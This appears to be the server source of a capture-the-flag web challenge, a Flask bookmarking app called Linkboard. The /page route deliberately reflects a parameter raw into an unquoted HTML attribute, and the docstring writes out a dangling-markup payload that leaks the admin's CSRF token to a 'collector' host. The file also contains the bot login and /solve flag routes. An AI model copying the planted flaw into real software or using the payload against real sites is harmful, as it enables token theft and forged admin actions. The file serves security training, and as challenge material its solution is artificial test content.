# SPDX-License-Identifier: MIT
"""Linkboard — a bookmarking app. The staff review page GET /page?u=... reflects
the `u` value RAW into an UNQUOTED HTML attribute (a URL context), and the page's
CSP blocks ALL scripts (`script-src 'none'`) — so a `<script>`/`onerror` payload is
dead. But the page is rendered on a SINGLE LINE, and a hidden CSRF token sits
further along it:

    ...<link rel=stylesheet href=<u>>...<input type=hidden name=csrf value=<TOKEN>>...<a href='/home'>...

Because `u` is unquoted and unescaped, an injected `x><img src='http://collector:9000/leak?d=`
opens a dangling `<img>` whose single-quoted `src` swallows the rest of the source
line — INCLUDING the token — up to the next `'` (in the trailing `<a href='/home'>`).
The browser then fetches that URL, leaking the token to the collector. No script
runs; the exfil is pure dangling markup.

(The template is deliberately one line: Chrome's dangling-markup mitigation blocks
a resource URL formed across a NEWLINE, but not one on a single line — see SOLUTION.)

/page is staff-only, so an attacker can't read the token directly; only the admin
bot renders it, and the dangling markup carries it out.
"""
import collections
import hmac
import html
import ipaddress
import json
import os
import urllib.request

from flask import Flask, Response, request

FLAG_PATH = os.environ.get("FLAG_PATH", "/var/lib/lab/flag.txt")
ADMIN_SESSION = os.environ.get("ADMIN_SESSION", "")
ADMIN_CSRF = os.environ.get("ADMIN_CSRF", "")
BOT_KEY = os.environ.get("BOT_KEY", "")
OOB_HOST = os.environ.get("OOB_HOST", "collector")
OOB_PORT = int(os.environ.get("OOB_PORT", "9000"))
BACKEND_CIDR = os.environ.get("BACKEND_CIDR", "172.31.240.0/24")
MAX_QUEUE = 64

app = Flask(__name__)
_queue: collections.deque = collections.deque(maxlen=MAX_QUEUE)
_state = {"action_done": False}


def _from_backend() -> bool:
    try:
        return ipaddress.ip_address(request.remote_addr or "") in ipaddress.ip_network(BACKEND_CIDR)
    except ValueError:
        return False


def _is_admin() -> bool:
    return bool(ADMIN_SESSION) and hmac.compare_digest(request.cookies.get("session", ""), ADMIN_SESSION)


@app.get("/health")
def health() -> Response:
    return Response("ok", mimetype="text/plain")


@app.get("/")
def home() -> Response:
    return Response(
        "<!doctype html><html><head><title>Linkboard</title></head><body>"
        "<h1>Linkboard</h1><p>Staff review bookmarks at <code>/page?u=&lt;url&gt;</code> "
        "(staff only). Report a page: <code>POST /report {\"url\":\"...\"}</code>.</p></body></html>",
        mimetype="text/html",
    )


@app.get("/page")
def page() -> Response:
    """Staff-only. Reflects ?u= RAW into an UNQUOTED attribute, on a single line,
    with the CSRF token further along the same line."""
    if not _is_admin():
        return Response("forbidden — staff only", status=403, mimetype="text/plain")
    u = request.args.get("u", "/welcome")
    # SINGLE-LINE body (no newlines): the dangling <img src> can only swallow the
    # token if no newline intervenes (Chrome mitigation). `u` is unquoted + raw.
    body = (
        "<!doctype html><html><head><title>Review</title></head>"
        "<body><h1>Bookmark review</h1>"
        "<link rel=stylesheet href=" + u + ">"
        "<p>Reviewing bookmark.</p>"
        "<input type=hidden name=csrf value=" + html.escape(ADMIN_CSRF) + ">"
        "<a href='/home'>home</a></body></html>"
    )
    resp = Response(body, mimetype="text/html")
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; script-src 'none'; img-src *; style-src *; "
        "base-uri 'none'; object-src 'none'"
    )
    return resp


@app.post("/report")
def report() -> Response:
    url = ""
    if request.is_json:
        url = str((request.get_json(silent=True) or {}).get("url", ""))
    if not url:
        url = request.form.get("url", "")
    url = url.strip()
    if not url:
        return Response(json.dumps({"ok": False, "error": "url required"}),
                        mimetype="application/json", status=400)
    if url.startswith("http://") or url.startswith("https://"):
        return Response(json.dumps({"ok": False, "error": "submit a path, not a full URL"}),
                        mimetype="application/json", status=400)
    if not url.startswith("/"):
        url = "/" + url
    _queue.append(url)
    return Response(json.dumps({"ok": True, "queued": url}), mimetype="application/json")


@app.get("/internal/queue")
def internal_queue() -> Response:
    if not _from_backend():
        return Response("forbidden", status=403, mimetype="text/plain")
    urls = []
    while _queue:
        urls.append(_queue.popleft())
    return Response(json.dumps({"urls": urls}), mimetype="application/json")


@app.get("/internal/bot-login")
def bot_login() -> Response:
    if not _from_backend():
        return Response("forbidden", status=403, mimetype="text/plain")
    if not BOT_KEY or request.args.get("k", "") != BOT_KEY:
        return Response("forbidden", status=403, mimetype="text/plain")
    resp = Response("logged in", mimetype="text/plain")
    resp.set_cookie("session", ADMIN_SESSION, httponly=True, samesite="Lax")
    return resp


@app.post("/admin/action")
def admin_action() -> Response:
    body = request.get_json(silent=True) or {}
    token = str(body.get("csrf", "")) or request.form.get("csrf", "")
    if ADMIN_CSRF and hmac.compare_digest(token, ADMIN_CSRF):
        _state["action_done"] = True
        return Response(json.dumps({"ok": True, "action": "performed"}), mimetype="application/json")
    return Response(json.dumps({"ok": False, "error": "invalid or missing CSRF token"}),
                    mimetype="application/json", status=403)


@app.get("/oob/received")
def oob_received() -> Response:
    try:
        with urllib.request.urlopen(f"http://{OOB_HOST}:{OOB_PORT}/received", timeout=5) as r:
            body = r.read()
    except Exception as e:  # noqa: BLE001
        return Response(json.dumps({"ok": False, "error": str(e)}),
                        mimetype="application/json", status=502)
    return Response(body, mimetype="application/json")


@app.post("/solve")
def solve() -> Response:
    if _state["action_done"]:
        try:
            with open(FLAG_PATH, encoding="utf-8") as fh:
                flag = fh.read().strip()
        except OSError:
            flag = "(flag unavailable)"
        return Response(json.dumps({"ok": True, "flag": flag}), mimetype="application/json")
    return Response(json.dumps({"ok": False, "error": "perform /admin/action with the leaked CSRF token first"}),
                    mimetype="application/json", status=403)
